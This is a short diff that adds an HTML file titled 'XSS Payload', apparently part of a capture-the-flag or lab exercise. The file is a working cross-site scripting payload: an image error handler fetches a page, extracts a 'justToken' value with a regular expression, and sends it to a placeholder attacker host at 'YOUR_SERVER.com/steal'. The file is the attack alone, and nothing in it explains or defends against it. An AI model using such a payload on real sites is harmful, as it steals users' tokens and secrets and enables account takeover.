@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <head><title>XSS Payload</title></head>
+  <body>
+    <img src="x" onerror="
+      fetch('/tasks/preview/0/0')
+        .then(r => r.text())
+        .then(data => {
+          const token = data.match(/justToken\{([^}]+)\}/)[1];
+          fetch('https://YOUR_SERVER.com/steal?token=' + token);
+        });
+    ">
+  </body>
+</html>
